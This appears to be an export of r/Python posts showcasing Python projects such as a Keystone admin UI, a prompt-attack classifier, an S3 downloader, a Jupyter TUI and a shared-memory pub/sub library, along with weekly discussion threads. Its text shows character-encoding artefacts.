\- Good for Web tooling but it might be able to catch up to NiceGUI in web with consistent updates

    import winup
    from winup import ui
    
    # The @component decorator is optional for the main component, but good practice.
    @winup.component
    def App():
    ¬† ¬† """"""This is our main application component.""""""
    ¬† ¬† return ui.Column(
            props={
    ¬† ¬† ¬† ¬† ¬† ¬† ""alignment"": ""AlignCenter"", 
    ¬† ¬† ¬† ¬† ¬† ¬† ""spacing"": 20
    ¬† ¬† ¬† ¬† },
    ¬† ¬† ¬† ¬† children=[
    ¬† ¬† ¬† ¬† ¬† ¬† ui.Label(""üëã Hello, WinUp!"", props={""font-size"": ""24px""}),
    ¬† ¬† ¬† ¬† ¬† ¬† ui.Button(""Click Me!"", on_click=lambda: print(""Button clicked!""))
    ¬† ¬† ¬† ¬† ]
    ¬† ¬† )
    
    if __name__ == ""__main__"":
    ¬† ¬† winup.run(main_component_path=""helloworld:App"", title=""My First WinUp App"")

**Install:**  
`pip install winup`

**Please report any bugs you encounter, also give feedback or open issues/prs! GitHub Repo** [Here](http://github.com/mebaadwaheed/winup)"
1mb9c2t,IDMUI ‚Äì Identity Management User Interface for OpenStack Keystone,imran_1372,0,0,2025-07-28 07:00:15,https://www.reddit.com/r/Python/comments/1mb9c2t/idmui_identity_management_user_interface_for/,"üîç What My Project Does:
IDMUI is a web-based interface built with Python Flask to manage OpenStack Keystone services. It allows administrators to:

View and manage Keystone users, roles, and projects

Start/stop Keystone services on remote servers via SSH using the Paramiko library

Interact with the Keystone-related MySQL/MariaDB database from a user-friendly dashboard

Authenticate via Keystone and display role-based views


It simplifies identity service management tasks that usually require CLI or direct API calls.

üéØ Target Audience:
This project is primarily for:

Students and learners working with OpenStack in lab environments

DevOps engineers looking for lightweight service management tools

System admins who prefer a UI over command-line for identity management

Not recommended (yet) for production as it's a prototype, but it‚Äôs great for labs and demos.


‚öñÔ∏è Comparison:
Unlike Horizon (OpenStack's full dashboard), IDMUI is focused specifically on Keystone and aims to:

Be minimal and easy to deploy

Offer just the essential controls needed for identity and database interaction

Use lightweight Flask architecture vs. the heavier Django-based Horizon



---

üîó Demo Video: https://youtu.be/FDpKgDmPDew?si=hnjSoyvWcga7BPtc

üîó Source Code: https://github.com/Imran5693/idmui-app.git

I‚Äôd love feedback from the community! Let me know if you'd like to see other OpenStack services added or improved UI/UX.

#Python #Flask #OpenStack #Keystone #DevOps #Automation #OpenSource
#python #flaskapp #idmui #identitymanagment #openstack #keystone #devops #networkautomation #netdev #linuxautomation #linux #ubuntu #api 
"
1mb7bye,"Notepad: Python - A """"""fun"""""" coding challenge",LeafyDragon112,0,3,2025-07-28 04:56:58,https://www.reddit.com/r/Python/comments/1mb7bye/notepad_python_a_fun_coding_challenge/,"So I thought ""Python... in Notepad?""

And now I'm here, with a full ruleset, google doc, and website.

Notepad: Python is a lightweight (and pretty painful) challenge to write a real, working Python program in Notepad

**The rules are simple:**

1. All code editing must be in Microsoft Notepad
2. Line wrap must be off (for readability)
3. Rename file to .py when running, then back to .txt when finished
4. No external help or autocomplete, everything is from memory

If you want to go hardcore, try to not run it until you're done coding!

Click [here](http://notepadpython.carrd.co) to see the full ruleset, and tips.

Click [here](https://github.com/Jimmy-Mc-Dude-Pants/Notepad-Python) for the Github repo for this project (it's small)

I'd love to see what you make, if you want, you can share it in the comments!

# What this project does

It‚Äôs a Python challenge where you're only allowed to write code in Windows Notepad‚Äîno IDE, no autocomplete, just barebones Python the hard way.

# Target audience

Python learners who want to improve syntax and logic from memory, and developers who enjoy minimalist or intentionally painful workflows.

# How it differs from other projects

Instead of focusing on what you build, this challenge focuses on *how* you build it‚Äîwithout modern tooling, for the rawest Python experience possible."
1mb751j,I built a Python library to detect AI prompt threats,sarthakai,0,5,2025-07-28 04:45:44,https://www.reddit.com/r/Python/comments/1mb751j/i_built_a_python_library_to_detect_ai_prompt/,"rival-ai is a library that can filter out harmful user queries before they hit your AI pipeline.

In just 3 lines of code, you can use it to ensure AI safety in your projects.

\- Install the rival-ai Python library.

\- Load the model.

\- Let it detect prompting attacks for your AI pipeline.

(See the repo for a ready-to-use Colab notebook).

Both the model and the code are completely open source.

[https://github.com/sarthakrastogi/rival](https://github.com/sarthakrastogi/rival)

Hit me with your malicious prompts in the comments and let's see if Rival can protect against them.

**What My Project Does -**¬†Classifies user queries as malicious prompt attacks or benign.

**Target Audience**¬†\- AI Engineers looking to protect small projects from prompt attacks

**Comparison**¬†\- Haven't been able to find alternatives, suggestions appreciated :)"
1mb2367,Looking for advice,justwatching9,2,17,2025-07-28 00:27:10,https://www.reddit.com/r/Python/comments/1mb2367/looking_for_advice/,"

I really have a lot of questions, I'm 18, ad I'm stressed about knowing as much as possible, I currently can use python comfortably, have done a few projects (Different practice projects+ CLI todo-list project that I have on github¬†[here](https://github.com/Unholyblue/TheUnholyStash)), nothing crazy, and I decided to wanna be a Data scientist engineer, combing both data science and data engineering skills, I have a plan on the skills I need to learn, but there is a lot and I'm too overwhelmed, and also, when I watch dev content I am bombarded by concepts in other low-level languages like C or C++, things like how memory is allocated, string literal (I know these from a basic point), and some other random concepts, so what advice would you give me?"
1mb1j12,Monday Daily Thread: Project ideas!,AutoModerator,7,0,2025-07-28 00:00:30,https://www.reddit.com/r/Python/comments/1mb1j12/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1matqbx,infinite-craft-gemini: an open source version of Infinite Craft using the Gemini API,Bl00dyFish,0,0,2025-07-27 18:29:28,https://www.reddit.com/r/Python/comments/1matqbx/infinitecraftgemini_an_open_source_version_of/,"**What My Project Does:**

This is an open-source project inspired by the game¬†*Infinite Craft*¬†using Google's Gemini API.  
It is programmed in Python and uses the¬†[NiceGUI](https://nicegui.io/)Python Library for the UI.

  
**Target Audience:**

I created this as a challenge to test out using an AI API in a project. I thought creating a version of Infinite Craft would be a fun way to do this!

**Comparison:**

It is basically the same as Infinite Craft, but since it's open source, you could edit it to your hearts desire.

Here is the link:¬†[https://github.com/BloodyFish/infinite-craft-gemini](https://github.com/BloodyFish/infinite-craft-gemini)

"
1mat3js,2D PDE Solvers In Python,Possible-Waltz6096,6,10,2025-07-27 18:04:20,https://www.reddit.com/r/Python/comments/1mat3js/2d_pde_solvers_in_python/,"Hey guys,

I‚Äôm currently working on a PDE solver project for university applications, thought it could be a nice little project to have a go at to demonstrate proficiency in partial differential equations. That being said I have never used python before, only MATLab and some C++, does anyone have some good resources they can link me to help with this project?

Cheers guys."
1maslkc,Arsenix: Small Async-First Algorithmic Engine for Recommendations and Pattern Learning,step-czxn,9,2,2025-07-27 17:44:57,https://www.reddit.com/r/Python/comments/1maslkc/arsenix_small_asyncfirst_algorithmic_engine_for/,"I built a high-performance async library called **Arsenix** ‚Äî a minimal yet powerful engine for real-time recommendation systems, user pattern learning, and data-driven backend logic. It came out of frustration with heavy ML toolkits and the boilerplate needed just to build a smart ‚ÄúFor You Page‚Äù (FYP)-style algorithm or track user behavior.

I wanted something that felt like a **tiny logic brain** for apps ‚Äî not a whole framework or model server. So I built Arsenix from scratch with `asyncio`, only 2 lightweight dependencies in core, and a declarative way to build recs, cache data, and learn what users love.

# üí° What My Project Does

**Arsenix** is a lightweight Python engine to embed in your app, backend, dashboard, or edge device. It lets you store content, track behavior, learn patterns, and serve personalized FYP-style recommendations ‚Äî **all asynchronously**.

Some standout features include:

* üîÅ **Async-first data store**: Store and retrieve algorithmic data with `await server.set()` and `get()` ‚Äî no blocking, no threads.
* ‚öôÔ∏è **Pluggable caching**: Use in-memory (`LocalCache`), file-based (`DiskCache`), or Redis (`RedisCache`) backends without changing your code.
* üíæ **Built-in persistence**: Save and load your engine's state with `.sync(""save"")` and `.sync(""load"")`.
* üîå **Small dependency core**: Just install via `pip install arsenix` and start coding. Advanced features like Redis and disk caching are optional extras.

# üß† Target Audience

* Backend developers building feed systems or user personalization tools
* Indie devs who want smart behavior without machine learning
* API and microservice engineers looking for embedded intelligence
* Hackers who like small tools that do a lot

Whether you're building a video app like TikTok, a dashboard with smart defaults, or a personal assistant backend ‚Äî Arsenix gives you **logic, patterns, and recs in one file**.

# üÜö Comparison

|Tool|Good At|Weak At|
|:-|:-|:-|
|**Arsenix**|Async, fast recs, low-overhead, plug-in cache|No deep learning|
|Surprise / LightFM|Trained recs|Needs training, sync-only|
|Firebase + Rules|Hosting + data sync|No personalization|
|FastAPI + Redis|Fast APIs|Pattern logic is manual|
|TinyDB|Lightweight storage|No logic or async|
|Redis|Storage/cache|Needs external logic layer|

Arsenix is **not a database** and **not an ML model** ‚Äî it‚Äôs the **tiny brain layer you plug into** anything else.  
Check it out on GitHub [Here](http://github.com/mebaadwaheed/arsenix) and please report bugs, give advice, open PRs and Issues!"
1mapwjr,PAR MCP Inspector TUI v0.2.0 released.,probello,11,0,2025-07-27 15:59:17,https://www.reddit.com/r/Python/comments/1mapwjr/par_mcp_inspector_tui_v020_released/,"# What My project Does:

PAR MCP Inspector TUI is a comprehensive Terminal User Interface (TUI) application for inspecting and interacting with Model Context Protocol (MCP) servers. This tool provides an intuitive interface to connect to MCP servers, explore their capabilities, and execute tools, prompts, and resources in real-time. Features both terminal interface and CLI commands with real-time server notifications.

# Whats New:

# v0.2.0

* Real-time server notifications with auto-refresh capabilities
* Enhanced resource download CLI with magic number file type detection
* Smart form validation with execute button control
* Per-server toast notification configuration
* Color-coded resource display with download guidance
* CLI debugging tools for arbitrary server testing
* TCP and STDIO transport support
* Dynamic forms with real-time validation
* Syntax highlighting for responses (JSON, Markdown, code)
* Application notifications for status updates and error handling

# Key Features:

* Easy-to-use TUI interface for MCP server interaction
* Multiple transport support (STDIO and TCP)
* CLI debugging tools for testing servers without configuration
* Resource download with automatic file type detection
* Real-time introspection of tools, prompts, and resources
* Dynamic forms with validation and smart controls
* Server management with persistent configuration
* Dark and light mode support
* Non-blocking async operations for responsive UI
* Capability-aware handling for partial MCP implementations

# GitHub and PyPI

* PAR MCP Inspector TUI is under active development and getting new features all the time.
* Check out the project on GitHub for full documentation, installation instructions, and to contribute: [https://github.com/paulrobello/par-mcp-inspector-tui](https://github.com/paulrobello/par-mcp-inspector-tui)
* PyPI [https://pypi.org/project/par-mcp-inspector-tui/](https://pypi.org/project/par-mcp-inspector-tui/)

# Comparison:

I have not found any other comprehensive TUI applications specifically designed for Model Context Protocol server inspection and interaction. This fills a gap for developers who need to debug, test, and explore MCP servers in a visual terminal interface.

# Target Audience

Developers working with Model Context Protocol (MCP) servers, AI/ML engineers building context-aware applications, and anyone who loves terminal interfaces for debugging and development tools."
1maocfk,robinzhon: a library for fast and concurrent S3 object downloads,fexx3l,31,46,2025-07-27 14:56:26,https://www.reddit.com/r/Python/comments/1maocfk/robinzhon_a_library_for_fast_and_concurrent_s3/,"**What My Project Does**

**robinzhon** is a high-performance Python library for fast, concurrent S3 object downloads. Recently at work I have faced that we need to pull a lot of files from S3 but the existing solutions are slow so I was thinking in ways to solve this and that's why I decided to create **robinzhon**.

The main purpose of **robinzhon** is to download high amounts of S3 Objects without having to do extensive manual work trying to achieve optimizations.

**Target Audience**  
If you are using AWS S3 then this is meant for you, any dev or company that have a high s3 objects download can use it to improve their process performance

**Comparison**  
I know that you can implement your own concurrent approach to try to improve your download speed but **robinzhon** can be 3 times faster even 4x if you start to increase the `max_concurrent_downloads` but you must be careful because AWS can start to fail due to the amount of requests.

GitHub: [https://github.com/rohaquinlop/robinzhon](https://github.com/rohaquinlop/robinzhon)"
1ma85ub,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,7,6,2025-07-27 00:00:32,https://www.reddit.com/r/Python/comments/1ma85ub/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1ma7h5v,"Is it time for Python 3.26, (calendar versioning)?",Spitfire1900,0,5,2025-07-26 23:27:32,https://www.reddit.com/r/Python/comments/1ma7h5v/is_it_time_for_python_326_calendar_versioning/,"It would be a lot easier to convey what year depreciations happen or tell how old a Python release is, and follows a similar naming scheme as C.  I know that this was already covered in PEP 2026 but wondered what peoples‚Äô thoughts were here."
1ma72k4,Any good pygame tutorials?,Boring-Picture-1456,10,8,2025-07-26 23:08:09,https://www.reddit.com/r/Python/comments/1ma72k4/any_good_pygame_tutorials/,"I really need a short, clear Pygame tutorial. Watched Clear Code, but his explanations feel too long and I forget details. Any recommendations? UPDATE: Found a good tutorial on flappy bird, and used that knowdge to make pong by myself!"
1ma6dbd,Python 3.14: time for a release name?,DorchioDiNerdi,360,50,2025-07-26 22:35:34,https://www.reddit.com/r/Python/comments/1ma6dbd/python_314_time_for_a_release_name/,"I know we don't have release names, but if it's not called ""Pi-thon"" it's gonna be such a missed opportunity. There will only be one version 3.14 ever..."
1ma5vaz,VideoConviction: A Python Codebase for Multimodal Stock Analysis from YouTube Financial Influencers,mgalarny,0,2,2025-07-26 22:13:01,https://www.reddit.com/r/Python/comments/1ma5vaz/videoconviction_a_python_codebase_for_multimodal/,"
VideoConviction: A Python Codebase for Multimodal Stock Analysis from YouTube Financial Influencers

**What My Project Does**  
[VideoConviction](https://github.com/gtfintechlab/VideoConviction) is a Python-based codebase for analyzing stock recommendations made by YouTube financial influencers (‚Äúfinfluencers‚Äù). It supports multimodal benchmarking tasks like extracting ticker names, classifying buy/sell actions, and scoring speaker conviction based on tone and delivery.

**Project Structure**  
The repo is modular and organized into standalone components:

* `youtube_data_pipeline/` ‚Äì Uses the YouTube Data API to collect metadata, download videos, and run ASR with OpenAI's Whisper.
* `data_analysis/` ‚Äì Jupyter notebooks for exploratory analysis and dataset validation.
* `prompting/` ‚Äì Run LLM and MLLM inference using open and proprietary models (e.g., GPT-4o, Gemini).
* `back_testing/` ‚Äì Evaluate trading strategies based on annotated stock recommendations.
* `process_annotations_pipeline/` ‚Äì Cleans and merges expert annotations with transcripts and video metadata.

Each subdirectory has separate setup instructions. You can run each part independently. 

**Who It‚Äôs For**

* Python users looking to collect and analyze YouTube data using the YouTube API
* People exploring how to use LLMs and MLLMs analyzing text and/or video
* People building or evaluating multimodal NLP/ML pipelines (careful multimodal models can more be expensive to run)
* Anyone interested in **prompt engineering**, **financial content analysis**, or backtesting influencer advice

**Links**  
üîó GitHub (Recommended): [https://github.com/gtfintechlab/VideoConviction](https://github.com/gtfintechlab/VideoConviction)  
üìπ Project Overview (if you want to learn about some llm and financial analysis): [YouTube](https://youtu.be/A8TD6Oage4E?si=WdfTzRKMhS4XRMJo)  
üìÑ Paper (if you really care about the details): [SSRN](https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5315526)"
1ma0852,Erys: A Terminal Interface for Jupyter Notebooks,SirPsychological8555,105,20,2025-07-26 18:13:55,https://www.reddit.com/r/Python/comments/1ma0852/erys_a_terminal_interface_for_jupyter_notebooks/,"**Erys**: A Terminal Interface for Jupyter Notebooks

I recently built a TUI tool called **Erys** that lets you **open, edit, and run Jupyter Notebooks entirely from the terminal**. This came out of frustration from having to open GUIs just to comfortably interact with and edit notebook files. Given the impressive rendering capabilities of modern terminals and **Textualize.io's Textual** library, which helps build great interactive and pretty terminal UI, I decided to build Erys.

**What My Project Does**  
Erys is a TUI for editing, executing, and interacting with Jupyter Notebooks directly from your terminal. It uses the Textual library for creating the interface and \`jupyter\_client\` for managing Python kernels. Some cool features are:

\- Interactive cell manipulation: split, merge, move, collapse, and change cell types.

\- Syntax highlighting for Python, Markdown, and more.

\- Background code cell execution.

\- Markup rendering of ANSI escaped text outputs resulting in pretty error messages, JSONs, and more.

\- Markdown cell rendering.

\- Rendering image and HTML output from code cell execution using Pillow and web-browser.

\- Works as a lightweight editor for source code and text files.

Code execution uses the Python environment in which Erys is opened and requires installation of ipykernel. 

In the future, I would like to add code completion using IPython for the code cells, vim motions to cells, and also image and HTML rendering directly to the terminal.

**Target Audience**

Fans of TUI applications, Developers who prefer terminal-based workflows, developers looking for terminal alternatives to GUIs. 

**Comparison**

\`jpterm\` is a similar tool that also uses Textual. What \`jpterm\` does better is that it allows for selecting kernels and provides an interface for \`ipython\`. I avoided creating an interface for ipython since the existing ipython tool is a good enough TUI experience. Also, Erys has a cleaner UI, more interactivity with cells, and rendering options for images, HTML outputs, and JSON. 

Check it out on [Github](https://github.com/natibek/erys) and [Pypi](https://pypi.org/project/erys/) pages. Give it a try! Do share bugs, features, and quirks."
1m9zwfh,Karaoke maker python project,yagami_raito23,8,4,2025-07-26 18:00:37,https://www.reddit.com/r/Python/comments/1m9zwfh/karaoke_maker_python_project/,"Hii,

I tried using some of the karaoke video makers but from what I've seen, they use speech-to-text to time the lyrics. However, I am lazy and wondered why we can't just use the already timed lyrics in musixmatch and lrclib. The only drawback is that most of them are done per line as opposed to per word but that was an okay compromise for me.

So I (vibe) coded this simple python workflow that takes everything from a search query or youtube url to a karaoke video. It goes like this:

search term or url -> downloads mp3 -> split vocals / instrumental using¬†[nomadkaraoke/python-audio-separator](https://github.com/nomadkaraoke/python-audio-separator)\-> get synced lyrics using¬†[moehmeni/syncedlyrics](https://github.com/moehmeni/syncedlyrics)\-> convert to subtitles -> burn subtitles with instrumental for final video

here's the project:¬†[el-tahir/karaoke](https://github.com/el-tahir/karaoke). and here is an example of the generated video :¬†[https://youtu.be/vKunrdRmMCE?si=xsyavSAVk43t5GnB](https://youtu.be/vKunrdRmMCE?si=xsyavSAVk43t5GnB)¬†.

I would love some feedback, especially from experienced devs!!

  
**What My Project Does**:  
creates karaoke videos from a search term or youtube url.

**Target Audience**:  
just a toy project

**Comparison**:  
Instead of trying to use speech-to-text to time lyrics, it uses already synced lyrics from sources like musixmatch and lrclib."
1m9ypdz,üß† Maze of Me ‚Äì A CLI game where your own Google & Spotify data generate emotional rooms and AI NPCs,bakill717,0,0,2025-07-26 17:11:38,https://www.reddit.com/r/Python/comments/1m9ypdz/maze_of_me_a_cli_game_where_your_own_google/,"**What My Project Does**  
*Maze of Me* is a text-based psychological adventure game built entirely in Python. After logging in with **Google and Spotify**, it collects your data (calendar events, YouTube history, playlists, top tracks) and uses it to generate:

* üé≠ Emotion-based rooms (e.g., sad, angry, happy)
* üó£Ô∏è AI-powered NPCs using **locally run LLaMA models**
* üé∂ Personalized soundtracks from your own Spotify history

Each room in the maze is tied to an emotional tone and plays one of your own songs that matches the mood. NPCs speak using cryptic dialogue generated from personal hooks (e.g. your name, events, YouTube titles) injected into LLM prompts.

**Target Audience**

* Python devs interested in LLMs, procedural generation, and emotional narrative
* AI/ML tinkerers exploring local model use cases
* Open-source fans who value privacy (all data is stored locally, nothing is uploaded)
* Anyone who enjoys weird experiments that blend code, psychology, and storytelling

This is **not production-ready,** more of a functional, open-ended experimental project. Think of it as a **personalized Black Mirror episode‚Ä¶ in Python**.

**Comparison**  
Unlike typical text-based games or chatbot experiences, *Maze of Me*:

* Uses **your real data** to shape gameplay
* Runs **100% offline**, with no external calls
* Integrates **music + LLM + emotion modeling**
* NPCs are generated per room using a rotating cache and prompt injection
* Music is matched using Spotify‚Äôs valence/energy and downloaded locally via `yt-dlp`

There‚Äôs no comparable game (CLI or GUI) that procedurally generates *you-based* environments using local LLMs and real-world data in this way.

**üé• Trailer video:**  
[https://www.youtube.com/watch?v=LTZwhyrfTrY](https://www.youtube.com/watch?v=LTZwhyrfTrY)

**üß† GitHub repo:**  
[https://github.com/bakill3/maze-of-me](https://github.com/bakill3/maze-of-me)

Would love feedback, ideas, or collaborators. Facebook & Instagram support is next on the roadmap, along with a potential GUI."
1m9yj6e,I made a CLI game that pulls your Spotify & Google data to generate emotional rooms and AI NPCs,bakill717,0,9,2025-07-26 17:04:42,https://www.reddit.com/r/Python/comments/1m9yj6e/i_made_a_cli_game_that_pulls_your_spotify_google/,"Not sure if this is too weird, but I‚Äôve been building a psychological game in Python that takes your Spotify history, calendar events, YouTube titles, and more‚Ä¶ and turns them into a maze of rooms with emotions.

Each room plays a song from your own playlists, and the NPCs talk using your own context (name, event, time, etc.) via local LLaMA.

It‚Äôs an open-source project, 100% offline, no tracking.

I just made a short trailer to explain it visually:  
üé• [https://www.youtube.com/watch?v=LTZwhyrfTrY](https://www.youtube.com/watch?v=LTZwhyrfTrY)

Full repo and install instructions:  
üîó [https://github.com/bakill3/maze-of-me](https://github.com/bakill3/maze-of-me)

Feedback welcome, still working on adding Facebook/Instagram support and a GUI."
1m9so08,Polylith: a Monorepo Architecture,david-vujic,42,16,2025-07-26 12:55:59,https://www.reddit.com/r/Python/comments/1m9so08/polylith_a_monorepo_architecture/,"Project name: **The Python tools for the Polylith Architecture**

# What My Project Does

The main use case is to support Microservices (or apps) in a Monorepo, and easily share code between the services. You can use Polylith with *uv, Poetry, Hatch, Pixi* or any of your favorite packaging & dependency management tool.

Polylith is an Architecture with tooling support. The architecture is about writing small & reusable Python components - building blocks - that are very much like LEGO bricks. Features are built by composing bricks. It‚Äôs really simple. The tooling adds visualization of the Monorepo, templating for creating new bricks and CI-specific features (such as determining which services to deploy when code has changed).

# Target Audience

Python developer teams that develop and maintain services using a Microservice setup.

# Comparison

There‚Äôs similar solutions, such as uv workspaces or Pants build. Polylith adds the Architecture and Organization of a Monorepo. All code in a Polylith setup - yes, all Python code - is available for reuse. All code lives in the same virtual environment. This means you have one set of linting and typing rules, and run all code with the same versions of dependencies.

This fits very well with REPL Driven Development and interactive Notebooks.

Recently, I talked about this project at **FOSDEM 2025**, the title of the talk is ""*Python Monorepos & the Polylith Developer Experience*"". You'll find it in the videos section of the docs.

# Links

Docs: [https://davidvujic.github.io/python-polylith-docs/](https://davidvujic.github.io/python-polylith-docs/)  
Repo: [https://github.com/DavidVujic/python-polylith](https://github.com/DavidVujic/python-polylith)"
1m9sn5f,SharedPubSub - A templated library to share data/objects in shared memory accross C++/Python/NodeJS,None,2,0,2025-07-26 12:54:50,https://www.reddit.com/r/Python/comments/1m9sn5f/sharedpubsub_a_templated_library_to_share/,"I needed a way to get simple data and objects (like sensors) out of a real-time loop, lock-free, and share it with other programs on the system that are not necessarily written in the same language. I also wanted the subscriber either read at will or get notified without spin looping, and save CPU work. I couldn't find a library that is simple to use so I made my own.

You can either use a pub/sub system, read/write the values directly, and you can also simply get notified by the publisher to do something. It is compatible with atomic types so the reads/writes for those types are thread safe. It is compatible with C++, Python and NodeJs, in 32-bit or 64-bit x86 and ARM.

For C++, the classes are templated, meaning you can create publishers and subscribers with the desired data type in shared memory, without having to parse bytes like some other libraries.

For Python and NodeJS, all base types and a string object are defined, and custom classes can be implemented easily.

Basically, how it works, is by combining POSIX shared memory to share data, POSIX condition\_variable to notify, and a lock-free queue so a subscriber can have updated data in order, or read at wish. From what I could gather it is pretty standard practice, but I'm not aware of a simple library for this.

Visit the github repo for a demo gif.

Here are snippets of the README

# Links

[https://github.com/SimonNGN/SharedPubSub](https://github.com/SimonNGN/SharedPubSub)

[https://pypi.org/project/SharedPubSub/](https://pypi.org/project/SharedPubSub/)

[https://www.npmjs.com/package/sharedpubsub](https://www.npmjs.com/package/sharedpubsub)

# Showcase compliant sections

**What My Project Does**

It allows to shared data/objects accross multiple processes or thread, and is cross-compatible between C++, Python, and Javascript (NodeJs).

**Target Audience**
It is mainly made for users who want to quickly and efficiently share sensor data. A user would have to review the github repo carefully to verify if it fits their application if they want to use it in production.

**Comparison**
To share data, a common protocol to use would be MQTT. But MQTT does not allow a publisher to share object directly, and does not allow a subscriber to read the data at will. For example, if an object is being published quickly and the subscriber process don't want to get interrupted, it does not need to receive the data. If multiple subscriber have different needs in term of data fetching, it is flexible. 

# C++

* user the header file

# Python

* `pip install SharedPubSub`

# NodeJS

* `npm install sharedpubsub`

# SharedPubSub

Provides Publisher and Subscriber classes for lock-free inter-process communication using POSIX shared memory with direct access, queues and notification.

# Main features

* Lock-free at runtime.
* Event driven notification ; no need to poll for data.
* Can use atomic types for main data, will automatically use the non-atomic version for queues and readings.
* Templated, meaning you can share normal data, structs, objects, etc.
* Cross-language compatible (C++,Python,Javascript(NodeJS) )
* Multiple subscribers to one publisher.
* Publisher can send data to subscriber's queue to read data in order.
* Publishers and Subscribers also have direct access to data for custom loop timing ; Subscriber can read the current value at any time.
* Publishers and Subscribers can exit and come back at any time because the data persists in shared memory.
* Compatible on 32-bit and 64-bit platforms.

# Main use cases

* Sharing data from a real-time loop to other threads/processes.
* Being able to receive data without spin looping.
* Being able to read data at any time, as opposed to MQTT which is only event driven. Ideal for multiple process that don't need the data at the same time or their processing time are different.
* Receive in-order data to make sure no data changes were missed.

# Functions (all languages)

# Publisher :

|Function|Description|Usecase|
|:-|:-|:-|
|`publish`|Set current value.<br>Push value to subscribers' queue.<br>Notify subscribers.|Set and send value to subscribers|
|`publishOnChange`|Same as publish, but only if the new value is different from the previous value.|Set and send value to subscribers only on change|
|`readValue`|Returns a copy of the topic's value.|To read before modifying the value. Useful if the publisher quits and comes back.|
|`setValue`|Set the current topic's value.|If we don't need to notify the subscribers, like if they do direct access.|
|`setValueAndNotifyOnChange`|Set the current topic's value and notify the subscribers.|If subscribers do direct access but still wants to get notified on change.|
|`setValueAndPush`|Set the current topic's value.<br>Push value to subcribers' queue.|To send multiple values into subscribers' queue to notify them later so they can consume all at once or let them consume at their own pace.|
|`notifyAll`|To notify all subscribers.|If we just simply want to notify.|
|`push`|Send a value to subscribers' queue.|If we want to send value without setting the topic's value.|

# Subscriber

|Function|Description|Usecase|
|:-|:-|:-|
|`subscribe`|Opens a queue in the topic.|Enables the subscriber to get notified and read values in a queue.|
|`clearQueue`|Clears the subscriber's topic queue.|To start fresh|
|`readValue`|Returns a copy of the topic's value.|To read the current topic's value without the queue.|
|`readWait`|Pops a value in the queue.<br>If no value,waits indefinitely for notification.<br>Pops a value in the queue.|If we want to consume the queue or wait for a value in the queue without polling or a spinloop.|
|`waitForNotify`|Simply wait for notification.|If the subscriber uses direct access but still wants to get notified.|

# Functions exclusive to languages

# C++

|Function|Description|Usecase|
|:-|:-|:-|
|`readWait(duration)`|Same as readWait, but with a timeout.|If we want to make sure the program doesn't get stuck waiting|
|`waitForNotify(duration)`|Same as waitForNotify, but with a timeout.|If we want to make sure the program doesn't get stuck waiting forever.|
|`rawValue`|returns a raw pointer to the topic's value.|To have direct access to the value. If publisher and subscribers have direct access to an atomic<> type or struc/object, they can use the value safely.|

# Python

|Function|Description|Usecase|
|:-|:-|:-|
|`readWaitMS(timeout)`|Same as readWait, but with a timeout.|If we want to make sure the program doesn't get stuck waiting forever.|
|`waitForNotifyMS(timeout)`|Same as waitForNotify, but with a timeout.|If we want to make sure the program doesn't get stuck waiting forever.|
|`rawValue`|returns a raw pointer to the topic's value.|To have direct access to the value. If a subscriber have direct access to an atomic<> type or struc/object, it can read the value safely.|

# NodeJs

|Function|Description|Usecase|
|:-|:-|:-|
|`readWaitAsync`|Same as readWait, but asynchronous.|Enables javascript to run something else while waiting|
|`readWaitMS(timeout)`|Same as readWait, but with a timeout.|If we want to make sure the program doesn't get stuck waiting forever.|
|`readWaitMSAsync(timeout)`|Same as readWaitMS, but asynchronous.|Enables javascript to run something else while waiting|
|`waitForNotifyAsync`|Same as waitForNotify, but asynchronous.|Enables javascript to run something else while waiting|
|`waitForNotifyMS(timeout)`|Same as waitForNotify, but with a timeout.|If we want to make sure the program doesn't get stuck waiting forever.|
|`waitForNotifyMSAsync(timeout)`|Same as waitForNotifyMS(timeout), but asynchronous.|Enables javascript to run something else while waiting|"
